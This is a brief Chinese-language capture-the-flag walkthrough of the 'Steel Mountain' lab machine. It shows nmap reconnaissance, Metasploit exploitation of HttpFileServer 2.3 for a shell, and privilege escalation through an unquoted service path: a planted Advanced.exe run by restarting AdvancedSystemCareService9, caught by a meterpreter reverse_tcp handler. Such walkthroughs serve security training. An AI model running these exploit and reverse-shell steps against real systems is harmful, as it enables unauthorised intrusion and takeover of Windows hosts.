Steel Mountain

一．侦察

nmap -sV 10.10.6.45

二．漏洞利用

利用httpfileserver 2.3的漏洞来获得权限

search httpfileserver

set LHOST 10.10.6.45

set LPORT 8080

run

获得shell

查找user.txt得到user.txt

三．权限提升

利用可信任服务路径漏洞进行权限提升

use windows/local/unquoted_service_path

set session 2

set AutoRunScript migrate -f

run

虽然失败了，但是木马被写入了，同时发现AdvancedSystemCareService9服务可以用提权

session 2

shell

sc stop AdvancedSystemCareService9

再开一个msf，使用multi/handler

set payload windows/meterpreter/reverse_tcp

set LPORT 4445

set LHOST 10.10.212.178

run

dir

路径下已经被写入了Advanced.exe

sc start AdvancedSystemCareService9

成功获得shell
